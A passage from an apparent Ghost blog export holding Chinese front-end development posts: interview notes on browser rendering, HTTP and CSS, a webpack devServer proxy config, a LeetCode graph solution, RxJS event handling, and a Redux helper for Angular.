js加载\n\n\n默认情况javascript是同步加载的，也就是javascript的加载时阻塞的。因此js加载要放后最后。也可以加上defer/async,或者动态创建script标签。前端图片等资源，是等html下载完成后，发起多线程请求加载。\n\n> dom渲染\n\n\n * 浏览器会解析三个东西：一个是HTML/SVG/XHTML，事实上，Webkit有三个C++的类对应这三类文档。解析这三种文件会产生一个DOM\n   Tree。CSS，解析CSS会产生CSS规则树。Javascript，脚本，主要是通过DOM API和CSSOM API来操作DOM Tree和CSS\n   Rule Tree.\n * 解析完成后，浏览器引擎会通过DOM Tree 和 CSS Rule Tree 来构造 Rendering Tree。注意：Rendering Tree\n   渲染树并不等同于DOM树，因为一些像Header或display:none的东西就没必要放在渲染树中了。CSS 的 Rule\n   Tree主要是为了完成匹配并把CSS Rule附加上Rendering\n   Tree上的每个Element。也就是DOM结点。也就是所谓的Frame。然后，计算每个Frame（也就是每个Element）的位置，这又叫layout和reflow过程。\n * 最后通过调用操作系统Native GUI的API绘制。转自知乎\n   [https://www.zhihu.com/question/20117417/answer/22359160]\n * 因此，要把css放head中。\n\n> Reflow 和 Repaint\n\n\nRepaint「重绘」改变 DOM 元素的视觉效果，如颜色，透明度，隐藏(visibility),outline 。一般自会递归自身和子元素。\nReflow「回流」，不仅会改变自己，还会影响别的元素。因此在要尽量避免这样的开销。比如一个元素大小改变了，一般会影响别的元素的布局。如display。\n\n减少回流\n * 不要用 inline style 或 table 布局；\n * 如果想设定元素的样式，通过改变元素的 class 名 (尽可能在 DOM 树的最里层)；\n * 用于表现动画的元素，使用 position 属性的 fixed 值或 absolute 值（脱离文档流）；\n * 减少不必要的 DOM 层级；\n * 避免设置多项内联样；；\n\n> HTTP协议 “无连接，无状态”\n\n\n无连接\n\n * HTTP/1.0\n   指的是每次连接只处理一个请求，服务端处理完客户端一次请求，等到客户端作出回应之后便断开连接；这种方式有利于节省服务器资源.明显，HTTP1.0，会在建立和断开连接上花费大部分时间；\n * HTTP/1.1 Keep-Alive提出来解决上面的问题，且持久连接称为了默认的连接方式。但是线端阻塞(head-of-line blocking),\n   它是指一个连接(connection)一次只提交一个请求的效率比较高, 多了就会变慢。 HTTP/1.1\n   试过用流水线(pipelining)来解决这个问题, 但是效果并不理想(数据量较大或者速度较慢的响应, 会阻碍排在他后面的请求).\n * HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行\n\n无状态\n\n * 无状态是指协议对于事务处理没有记忆能力，服务器不知道客户端是什么状态。即我们给服务器发送 HTTP\n   请求之后，服务器根据请求，会给我们发送数据过来，但是，发送完，不会记录任何信息。这样明显是不行的。Cookie+Session应运而生。\n\n> HTTP 2.0与HTTP 1.1区别\n\n\n * HTTP/2采用二进制格式而非文本格式\n * HTTP/2是完全多路复用的，而非有序并阻塞的——只需一个连接即可实现并行\n * 使用报头压缩，HTTP/2降低了开销\n * HTTP/2让服务器可以将响应主动“推送”到客户端缓存中\n\n> X-UA-Compatible\n\n\n指定IE=edge来指示IE使用它支持的最高模式。\n添加http头add_header \"X-UA-Compatible\" \"IE=Edge\";\n\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n\n\n> Google PageSpeed\n\n\nGoogle提供了\nPageSpeed工具，这是一个浏览器插件，可以很好地应用上文中Google所提到的Web优化实践——帮助你轻松对网站的性能瓶颈进行分析，并为你提供优化建议。\n\n> 301与302的区别\n\n\n301 redirect: 301 代表永久性转移(Permanently Moved)。\n302 redirect: 302 代表暂时性转移(Temporarily Moved )。\n\n * 对用户来说没有区别，他们看到效果只是一个跳转\n * 对于引擎及站长:302转向可能会有URL规范化及网址劫持的问题。可能被搜索引擎判为可疑转向，甚至认为是作弊。\n\n> 字符串拼接\n\n\n在Javascript中使用\"+\"号来拼接字符串效率是比较低的，因为每次运行都会开辟新的内存并生成新的字符串变量，然后将拼接结果赋值给新变量。与之相比更为高效的做法是使用数组的join方法，即将需要拼接的字符串放在数组中最后调用其join方法得到结果。\n\n> css关系选择符\n\n\n * E F 选择所有被E元素包含的F元素。\n * E>F 选择所有作为E元素的子元素F。\n * E+F 选择紧贴在E元素之后F元素。\n * E~F 选择E元素后面的所有兄弟元素F。\n\n> 事件触发器\n\n\n * fireEvent IE\n * dispatchEvent 其他高级浏览器\n\nvar fireEvent = function(element,event){  \n        if (document.createEventObject){  \n            // IE浏览器支持fireEvent方法  \n            var evt = document.createEventObject();  \n            return element.fireEvent('on'+event,evt)  \n        }  \n        else{  \n            // 其他标准浏览器使用dispatchEvent方法  \n            var evt = document.createEvent( 'HTMLEvents' );  \n            evt.initEvent(event, true, true);  \n            return !element.dispatchEvent(evt);  \n        }  \n}; \n\n\n> 事件监听/取消\n\n\n * attachevent detachEvent IE下事件名称+on\n * addeventlistener removeEventListener\n\n> Javascript内存泄露\n\n\n * 循环引用 一个 DOM 对象被一个 Javascript 对象引用，与此同时又引用同一个或其它的 Javascript 对象，这个 DOM\n   对象可能会引发内存泄露。IE 6,\n   7中有一部分对象并不是原生js对象。例如，其DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。这样就会触发循环引用，引起内存泄露\n * Javascript闭包\n * DOM插入\n\n> JavaScript 垃圾回收机制\n\n\n * 引用计数法 \n   早期IE采用的。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。\n * 标记清除法 \n   当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。更新的更好的方法。\n\n> text-overflow: clip|ellipsis|string;\n\n\nclip 修剪文本。\t\nellipsis 显示省略符号来代表被修剪的文本。\nstring 使用给定的字符串来代表被修剪的文本。\n\n\n> whiteSpace: normal|pre|nowrap|pre-wrap|pre-line|inherit\n\n\nnormal\t默认。空白会被浏览器忽略。\npre\t空白会被浏览器保留。其行为方式类似 HTML 中的 <pre> 标签。\nnowrap\t文本不会换行，文本会在在同一行上继续，直到遇到 <br> 标签为止。\npre-wrap\t保留空白符序列，但是正常地进行换行。\npre-line\t合并空白符序列，但是保留换行符。\ninherit\t规定应该从父元素继承 white-space 属性的值。\n\n\n> box-sizing content-box|border-box\n\n\n * content-box W3C盒模型\n * border-box 和IE盒模型一样（新的盒模型）\n\n> link和@import区别\n\n\n * link属于XHTML标签，除了加载CSS外，还能用于定义RSS, 定义rel连接属性等作用;而@import是CSS提供的，只能用于加载CSS;\n * 页面被加载的时，link会同时被加载，而@import引用的CSS会等到页面被加载完再加载;\n * import是CSS2.1 提出的，只在IE5以上才能被识别，而link是XHTML标签，无兼容问题;\n\n> HTML5为什么只需要写?\n\n\nHtml5不基于SGML,因此不需要对DTD进行引用，但是需要doctype来规范浏览器的行为（让浏览器按照他们应该的方式来运行）而HTML4.01基于SGML，所以需要对DTD进行引用，才能告知浏览器文档所使用的文档类型。\n\n> Margin垂直塌陷(collapse)问题\n\n\n折叠的产生情况：\n\n1.必须是处于常规文档流（非float和绝对定位）的块级盒子,并且处于同一个BFC当中。\n\n2.没有线盒，没有空隙（clearance，下面会讲到），没有padding和border将他们分隔开(ps\n:所以解决办法中有padding或者border两种办法)\n\n3.都属于垂直方向上相邻的外边距，\n\n解决办法：\n加border|padding|overflow:hidden\n\n> 对BFC规范(块级格式化上下文：block formatting context)的理解？\n\n\nBFC (Block Formatting Contexts) 即块级格式化上下文，从样式上看，它与普通的容器没有什么区别，但是从功能上，BFC\n可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器没有的一些特性，例如可以包含浮动元素，（如 overflow\n方法）就是触发了父元素的 BFC\n，使到它可以包含浮动元素，从而防止出现高度塌陷的问题。(在IE6-7中没有BFC，但是有hasLayout和BFC有相似的功能，*zoom: 1 触发\nhasLayout)\n\n> 移动端最小触控区域是多大?\n\n\nMIT的一项研究指出，大多数成年人的食指宽度为16-20mm，换算后大约为45-57px。Apple的44px*44px操作起来就很舒适了。\n\n> 页面编码和被请求的资源编码(如js)如果不一致如何处理?\n\n\nhttp://www.yyy.com/a.html 中嵌入了一个http://www.xxx.com/test.js\na.html 的编码是gbk或gb2312的。 而引入的js编码为utf-8的 ，那就需要在引入的时候\n<script src=\"http://www.xxx.com/test.js\" charset=\"utf-8\"></script>\n同理，如果你的页面是utf-8的，引入的js是gbk的，那么就需要加上charset=\"gbk\".\n\n\n> javascript里面的继承怎么实现，如何避免原型链上面的对象共享\n\n\n利用原型来继承,通过增加一个空的函数来避免原型链上的对象共享\n\nfunction Cat(name){  \nAnimal.call(this);  \nthis.name = name || 'Tom';\n}\n(function(){  // 创建一个没有实例方法的类  \nvar Super = function(){};  \nSuper.prototype = Animal.prototype;  \n//将实例作为子类的原型  Cat.prototype = new Super();\n})();\n\n\n> 如何保证一致性的代码风格\n\n\nJSLint|JSHint|ESLint|JSCS。在团队开发中，这些工具对于编写代码非常的有帮助，能够帮助团队开发者强制执行规定的风格指南，还能够通过静态分析捕获常见的错误。\n\n> CSS Hack\n\n\nIE6：_\nIE7：+\nIE6 & IE7：*\nIE6 & IE7 & IE8 & IE9 & IE10：\\9\nIE8 & IE9 & IE10:\\0\nIE9 & IE10：\\9\\0\n\n> createDocumentFragment\n\n\ncreateDocumentFragment方法用来创建一个DocumentFragment。在前面我们说到DocumentFragment表示一种轻量级的文档，它的作用主要是存储临时的节点用来准备添加到文档中，解决添加大量节点时的性能问题。\n(今天，面试被问了。)","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-30T06:57:26.000Z","created_by":"1","updated_at":"2018-09-12T07:42:42.000Z","updated_by":"1","published_at":"2017-03-31T00:25:47.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d326","uuid":"a7d52507-3ec8-48ea-967a-78474200b028","title":"webpack2--devServer","slug":"webpack2-devserver","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> 用dev-server开发时代理，决解开发时跨域问题\\n\\n\\n包装一下fetch,让url前面自动加上 `'/test'`。devServer配置，如下。\\n\\n```\\n    devServer: {\\n        contentBase: __dirname + \\\"/src\\\",  // New\\n        proxy: {\\n            '/test/*': {\\n              target: 'http://192.168.99.106:5000',\\n               pathRewrite: {'^/test' : ''},\\n               changeOrigin: true,\\n               secure: false\\n            }\\n         }\\n    },\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><blockquote>\n<p>用dev-server开发时代理，决解开发时跨域问题</p>\n</blockquote>\n<p>包装一下fetch,让url前面自动加上 <code>'/test'</code>。devServer配置，如下。</p>\n<pre><code>    devServer: {\n        contentBase: __dirname + &quot;/src&quot;,  // New\n        proxy: {\n            '/test/*': {\n              target: 'http://192.168.99.106:5000',\n               pathRewrite: {'^/test' : ''},\n               changeOrigin: true,\n               secure: false\n            }\n         }\n    },\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"106","plaintext":"> 用dev-server开发时代理，决解开发时跨域问题\n\n\n包装一下fetch,让url前面自动加上 '/test'。devServer配置，如下。\n\n    devServer: {\n        contentBase: __dirname + \"/src\",  // New\n        proxy: {\n            '/test/*': {\n              target: 'http://192.168.99.106:5000',\n               pathRewrite: {'^/test' : ''},\n               changeOrigin: true,\n               secure: false\n            }\n         }\n    },","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-03-30T08:58:59.000Z","created_by":"1","updated_at":"2017-03-30T09:13:30.000Z","updated_by":"1","published_at":"2017-03-30T09:13:30.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d327","uuid":"75fe9ee2-81c2-4cd0-8224-1e5aa9709a61","title":"Minimum Height Trees--LeetCode","slug":"minimum-height-trees-leetcode","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"问题：给定一个拥有树性质的无向图，图的每一个节点都可以视为一棵树的根节点。在所有可能的树中，找出高度最小的树，并返回他们的树根。\\n\\n######Given n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]\\n```\\n     0  1  2\\n      \\\\ | /\\n        3\\n        |\\n        4\\n        |\\n        5\\n```\\n######return [3, 4]\\n\\n\\n这个是无向图，建立邻接矩阵，使用Floyd算法，算出每个点到任意的点的距离，也就是树高度。 结果Time Limit Exceeded，仔细想下，Floyd算法会把每个点到任意的点的距离都求出来，这是没必要的。Dijkstra算法+减枝，应该更快。\\n<pre class=\\\"brush:cpp;\\\">\\n#define Infinity 99999999\\nclass Solution {\\npublic:\\n\\tvector<int> findMinHeightTrees(int n, vector<pair<int, int>>& edges) {\\n\\t\\tvector<vector<int>> V;\\n\\t\\tfor (int i = 0;i < n; ++i) {\\n\\t\\t\\tvector<int> vec(n, Infinity);\\n\\t\\t\\tvec[i] = 0;\\n\\t\\t\\tV.push_back(vec);\\n\\t\\t}\\n\\t\\tfor (int i = 0;i < edges.size();++i) {\\n\\t\\t\\tV[edges[i].first][edges[i].second] = 1;\\n\\t\\t\\tV[edges[i].second][edges[i].first] = 1;\\n\\t\\t}\\n\\t\\tfor (int i = 0;i < n;++i)\\n\\t\\t\\tfor (int j = 0;j < n;j++)\\n\\t\\t\\t\\tfor (int k = 0;k < n;k++)\\n\\t\\t\\t\\t\\tif (V[j][k]>V[j][i] + V[i][k])\\n\\t\\t\\t\\t\\t\\tV[j][k] = V[j][i] + V[i][k];\\n\\n\\t\\tint Min = INT_MAX;\\n\\t\\tvector<int> res;\\n\\t\\tfor (int i = 0;i < n;++i) {\\n\\t\\t\\tint Max = 0;\\n\\t\\t\\tfor (int j = 0;j < n;++j) {\\n\\t\\t\\t\\tif (Max < V[i][j]) {\\n\\t\\t\\t\\t\\tMax = V[i][j];\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\t\\t\\t//\\t\\tprintf(\\\"%d\\\\n\\\", Max);\\n\\t\\t\\tif (Min > Max) {\\n\\t\\t\\t\\tres.clear();\\n\\t\\t\\t\\tres.push_back(i);\\n\\t\\t\\t\\tMin = Max;\\n\\t\\t\\t}\\n\\t\\t\\telse {\\n\\t\\t\\t\\tif (Min == Max) {\\n\\t\\t\\t\\t\\tres.push_back(i);\\n\\t\\t\\t\\t}\\n\\t\\t\\t}\\n\\n\\t\\t}\\n\\t\\treturn res;\\n\\t}\\n};\\n</pre>\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>问题：给定一个拥有树性质的无向图，图的每一个节点都可以视为一棵树的根节点。在所有可能的树中，找出高度最小的树，并返回他们的树根。</p>\n<h6 id=\"givenn6edges0313234354\">Given n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]</h6>\n<pre><code>     0  1  2\n      \\ | /\n        3\n        |\n        4\n        |\n        5\n</code></pre>\n<h6 id=\"return34\">return [3, 4]</h6>\n<p>这个是无向图，建立邻接矩阵，使用Floyd算法，算出每个点到任意的点的距离，也就是树高度。 结果Time Limit Exceeded，仔细想下，Floyd算法会把每个点到任意的点的距离都求出来，这是没必要的。Dijkstra算法+减枝，应该更快。</p>\n<pre class=\"brush:cpp;\">\n#define Infinity 99999999\nclass Solution {\npublic:\n\tvector<int> findMinHeightTrees(int n, vector<pair<int, int>>& edges) {\n\t\tvector<vector<int>> V;\n\t\tfor (int i = 0;i < n; ++i) {\n\t\t\tvector<int> vec(n, Infinity);\n\t\t\tvec[i] = 0;\n\t\t\tV.push_back(vec);\n\t\t}\n\t\tfor (int i = 0;i < edges.size();++i) {\n\t\t\tV[edges[i].first][edges[i].second] = 1;\n\t\t\tV[edges[i].second][edges[i].first] = 1;\n\t\t}\n\t\tfor (int i = 0;i < n;++i)\n\t\t\tfor (int j = 0;j < n;j++)\n\t\t\t\tfor (int k = 0;k < n;k++)\n\t\t\t\t\tif (V[j][k]>V[j][i] + V[i][k])\n\t\t\t\t\t\tV[j][k] = V[j][i] + V[i][k];\n\n\t\tint Min = INT_MAX;\n\t\tvector<int> res;\n\t\tfor (int i = 0;i < n;++i) {\n\t\t\tint Max = 0;\n\t\t\tfor (int j = 0;j < n;++j) {\n\t\t\t\tif (Max < V[i][j]) {\n\t\t\t\t\tMax = V[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t//\t\tprintf(\"%d\\n\", Max);\n\t\t\tif (Min > Max) {\n\t\t\t\tres.clear();\n\t\t\t\tres.push_back(i);\n\t\t\t\tMin = Max;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif (Min == Max) {\n\t\t\t\t\tres.push_back(i);\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t\treturn res;\n\t}\n};\n</pre><!--kg-card-end: markdown-->","comment_id":"107","plaintext":"问题：给定一个拥有树性质的无向图，图的每一个节点都可以视为一棵树的根节点。在所有可能的树中，找出高度最小的树，并返回他们的树根。\n\nGiven n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]\n     0  1  2\n      \\ | /\n        3\n        |\n        4\n        |\n        5\n\n\nreturn [3, 4]\n这个是无向图，建立邻接矩阵，使用Floyd算法，算出每个点到任意的点的距离，也就是树高度。 结果Time Limit\nExceeded，仔细想下，Floyd算法会把每个点到任意的点的距离都求出来，这是没必要的。Dijkstra算法+减枝，应该更快。\n\n\n#define Infinity 99999999\nclass Solution {\npublic:\n\tvector findMinHeightTrees(int n, vector>& edges) {\n\t\tvector> V;\n\t\tfor (int i = 0;i < n; ++i) {\n\t\t\tvector vec(n, Infinity);\n\t\t\tvec[i] = 0;\n\t\t\tV.push_back(vec);\n\t\t}\n\t\tfor (int i = 0;i < edges.size();++i) {\n\t\t\tV[edges[i].first][edges[i].second] = 1;\n\t\t\tV[edges[i].second][edges[i].first] = 1;\n\t\t}\n\t\tfor (int i = 0;i < n;++i)\n\t\t\tfor (int j = 0;j < n;j++)\n\t\t\t\tfor (int k = 0;k < n;k++)\n\t\t\t\t\tif (V[j][k]>V[j][i] + V[i][k])\n\t\t\t\t\t\tV[j][k] = V[j][i] + V[i][k];\n\n\t\tint Min = INT_MAX;\n\t\tvector res;\n\t\tfor (int i = 0;i < n;++i) {\n\t\t\tint Max = 0;\n\t\t\tfor (int j = 0;j < n;++j) {\n\t\t\t\tif (Max < V[i][j]) {\n\t\t\t\t\tMax = V[i][j];\n\t\t\t\t}\n\t\t\t}\n\t\t\t//\t\tprintf(\"%d\\n\", Max);\n\t\t\tif (Min > Max) {\n\t\t\t\tres.clear();\n\t\t\t\tres.push_back(i);\n\t\t\t\tMin = Max;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tif (Min == Max) {\n\t\t\t\t\tres.push_back(i);\n\t\t\t\t}\n\t\t\t}\n\n\t\t}\n\t\treturn res;\n\t}\n};","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-04-06T06:40:24.000Z","created_by":"1","updated_at":"2017-04-06T06:56:27.000Z","updated_by":"1","published_at":"2017-04-06T06:46:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d328","uuid":"67b836f2-3fd9-4afa-af8e-65c6eaea4dde","title":"Rxjs学习","slug":"rxjsxue-xi","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"我们在用canvas画图的时候。一般实现\\n```\\nvar isDown=false;\\ndom.addEventListen('mousedown',function(){\\n     isDown=true;\\n},false)\\ndom.addEventListen('mouseup',function(){\\n     isDown=false;\\n},false)\\ndom.addEventListen('mousemove',function(){\\n     if(isDown){\\n     //xxxxxx\\n     }\\n},false)\\n```\\n最近发现一个Rxjs的库。实现很巧妙。\\n```\\n\\t\\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown').map(()=>'down')\\n\\t\\tconst up$ = Rx.Observable.fromEvent(dom, 'mouseup').map(() => 'up')\\n\\t\\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\\n\\n\\t\\tconst upAndDown$ = up$.merge(down$)\\n\\t\\tupAndDown$.switchMap(action => \\n                    action==='down'?move$:Rx.Observable.empty() \\n\\t\\t).subscribe(value => {\\n\\t\\t\\tconsole.log(value)\\n\\t\\t})\\n```\\n不过我也要mousedown按下的事件，稍微改下代码就行,实现如下：\\n```\\n\\t\\n\\t\\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown')\\n\\t\\tconst up$ = Rx.Observable.fromEvent(dom , 'mouseup').map(() => 'up')\\n\\t\\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\\n\\n\\t\\tconst upAndDown$ = up$.merge(down$)\\n\\t\\tupAndDown$.switchMap(action => {\\n\\t\\t\\tif (action != 'up') {\\n\\t\\t\\t\\treturn move$.startWith(action);\\n\\t\\t\\t} else {return Rx.Observable.empty() }\\n\\t\\t}).subscribe(value => {\\n\\t\\t\\tconsole.log(value)\\n\\t\\t})\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>我们在用canvas画图的时候。一般实现</p>\n<pre><code>var isDown=false;\ndom.addEventListen('mousedown',function(){\n     isDown=true;\n},false)\ndom.addEventListen('mouseup',function(){\n     isDown=false;\n},false)\ndom.addEventListen('mousemove',function(){\n     if(isDown){\n     //xxxxxx\n     }\n},false)\n</code></pre>\n<p>最近发现一个Rxjs的库。实现很巧妙。</p>\n<pre><code>\t\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown').map(()=&gt;'down')\n\t\tconst up$ = Rx.Observable.fromEvent(dom, 'mouseup').map(() =&gt; 'up')\n\t\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\n\n\t\tconst upAndDown$ = up$.merge(down$)\n\t\tupAndDown$.switchMap(action =&gt; \n                    action==='down'?move$:Rx.Observable.empty() \n\t\t).subscribe(value =&gt; {\n\t\t\tconsole.log(value)\n\t\t})\n</code></pre>\n<p>不过我也要mousedown按下的事件，稍微改下代码就行,实现如下：</p>\n<pre><code>\t\n\t\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown')\n\t\tconst up$ = Rx.Observable.fromEvent(dom , 'mouseup').map(() =&gt; 'up')\n\t\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\n\n\t\tconst upAndDown$ = up$.merge(down$)\n\t\tupAndDown$.switchMap(action =&gt; {\n\t\t\tif (action != 'up') {\n\t\t\t\treturn move$.startWith(action);\n\t\t\t} else {return Rx.Observable.empty() }\n\t\t}).subscribe(value =&gt; {\n\t\t\tconsole.log(value)\n\t\t})\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"108","plaintext":"我们在用canvas画图的时候。一般实现\n\nvar isDown=false;\ndom.addEventListen('mousedown',function(){\n     isDown=true;\n},false)\ndom.addEventListen('mouseup',function(){\n     isDown=false;\n},false)\ndom.addEventListen('mousemove',function(){\n     if(isDown){\n     //xxxxxx\n     }\n},false)\n\n\n最近发现一个Rxjs的库。实现很巧妙。\n\n\t\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown').map(()=>'down')\n\t\tconst up$ = Rx.Observable.fromEvent(dom, 'mouseup').map(() => 'up')\n\t\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\n\n\t\tconst upAndDown$ = up$.merge(down$)\n\t\tupAndDown$.switchMap(action => \n                    action==='down'?move$:Rx.Observable.empty() \n\t\t).subscribe(value => {\n\t\t\tconsole.log(value)\n\t\t})\n\n\n不过我也要mousedown按下的事件，稍微改下代码就行,实现如下：\n\n\t\n\t\tconst down$ = Rx.Observable.fromEvent(dom , 'mousedown')\n\t\tconst up$ = Rx.Observable.fromEvent(dom , 'mouseup').map(() => 'up')\n\t\tvar move$ = Rx.Observable.fromEvent(dom, 'mousemove')\n\n\t\tconst upAndDown$ = up$.merge(down$)\n\t\tupAndDown$.switchMap(action => {\n\t\t\tif (action != 'up') {\n\t\t\t\treturn move$.startWith(action);\n\t\t\t} else {return Rx.Observable.empty() }\n\t\t}).subscribe(value => {\n\t\t\tconsole.log(value)\n\t\t})","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2017-05-08T14:17:19.000Z","created_by":"1","updated_at":"2017-05-08T14:28:58.000Z","updated_by":"1","published_at":"2017-05-08T14:28:58.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d329","uuid":"6c6d4e99-4d70-4003-8d76-070ca58e4710","title":"ngDva","slug":"ngdva","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"最近在ng4上面用redux，感觉redux原生的Reducer写法还是太麻烦了。写了一个function生成。还加入co用于 Generator 函数的自动执行和全局store修改。还有日志功能，输出action.type，action.payload,当前Reducer的参数即model的状态，全局的store（用于修改其它Reducer/model中的状态）。\\n![](/content/images/2017/05/QQ--20170515190744.png)\\n```\\nimport co from 'co';\\nimport * as warning from 'warning';\\n\\nconst SEP = '/'\\nfunction run(model: any, store, log) {\\n    const { namespace, effects } = model;\\n    warning(namespace != null, `namespace is a must`);\\n    warning(effects != null, `effects is a must`);\\n    function applyNamespace(type) {\\n        function getNamespacedReducers(reducers) {\\n            return Object.keys(reducers).reduce((memo, key) => {\\n                warning(\\n                    key.indexOf(`${namespace}${SEP}`) !== 0,\\n                    `app.model: ${type.slice(0, -1)} ${key} should not be prefixed with namespace ${namespace}`,\\n                );\\n                memo[`${namespace}${SEP}${key}`] = reducers[key];\\n                return memo;\\n            }, {});\\n        }\\n\\n        if (model[type]) {\\n            if (type === 'effects') {\\n\\n                model[type] = getNamespacedReducers(model[type]);\\n\\n            }\\n        }\\n    }\\n\\n    applyNamespace('effects');\\n    Object.defineProperty(model, 'namespace', { enumerable: false, writable: false, configurable: false })\\n    Object.defineProperty(model, 'effects', { enumerable: false, writable: false, configurable: false })\\n\\n    // for(var x in model){\\n    //     debugger;\\n    // }\\n    function res(state = model.state, action) {\\n\\n        for (var key in model.effects) {\\n            if (action.type == key) {\\n                co(model.effects[key].bind(state, action, store)).then((val) => {\\n                    if (action.callback != null) {\\n                        action.callback(val)\\n                    }\\n                    if (process.env.node_ENV != 'production') {\\n                        if (log) {\\n                            console.group(\\\"dispatch log\\\");\\n                            console.log(\\\"action type:\\\",action.type);\\n                            console.log(\\\"action payload:\\\",action.payload);\\n                            console.log(\\\"current state:\\\",state);\\n                            console.log(\\\"global store:\\\",store);\\n                            console.groupEnd();\\n                        }\\n                    }\\n                }, (e) => { console.error(e.stack); })\\n\\n                return state\\n            }\\n        }\\n        return state;\\n    }\\n    return res\\n}\\n\\nfunction dva(models, log = false) {\\n\\n    let store = {};\\n    let root = {}\\n    models.forEach((x) => {\\n\\n        root[x.namespace] = x.state;\\n        store[x.namespace] = run(x, root, log);\\n    });\\n    return store;\\n}\\nexport default dva;\\n```\\n使用：\\n```\\nconst data = {\\n    namespace: 'data',\\n\\n    state: {\\n        cout:0\\n    },\\n\\n    effects: {\\n        *INCREMENT({payload}) {\\n            var data=yield new Promise(function(resolve, reject) {\\n                    setTimeout(()=>{\\n                        resolve(2)\\n                    },1000)\\n                });\\n            \\n            this.cout += data;\\n        },\\n        *DECREMENT({payload},store) {\\n            this.cout -= 1;\\n         //   console.log(store);\\n         //   setTimeout(()=>{store.data.state+=1;},1000)\\n         //   store.data.state-=1;\\n        },\\n        *RESET({payload}) {\\n            this.cout = 0;\\n        }\\n    }\\n}\\n\\nStoreModule.provideStore(dva([data],true)),\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>最近在ng4上面用redux，感觉redux原生的Reducer写法还是太麻烦了。写了一个function生成。还加入co用于 Generator 函数的自动执行和全局store修改。还有日志功能，输出action.type，action.payload,当前Reducer的参数即model的状态，全局的store（用于修改其它Reducer/model中的状态）。<br>\n<img src=\"/content/images/2017/05/QQ--20170515190744.png\" alt=\"\"></p>\n<pre><code>import co from 'co';\nimport * as warning from 'warning';\n\nconst SEP = '/'\nfunction run(model: any, store, log) {\n    const { namespace, effects } = model;\n    warning(namespace != null, `namespace is a must`);\n    warning(effects != null, `effects is a must`);\n    function applyNamespace(type) {\n        function getNamespacedReducers(reducers) {\n            return Object.keys(reducers).reduce((memo, key) =&gt; {\n                warning(\n                    key.indexOf(`${namespace}${SEP}`) !== 0,\n                    `app.model: ${type.slice(0, -1)} ${key} should not be prefixed with namespace ${namespace}`,\n                );\n                memo[`${namespace}${SEP}${key}`] = reducers[key];\n                return memo;\n            }, {});\n        }\n\n        if (model[type]) {\n            if (type === 'effects') {\n\n                model[type] = getNamespacedReducers(model[type]);\n\n            }\n        }\n    }\n\n    applyNamespace('effects');\n    Object.defineProperty(model, 'namespace', { enumerable: 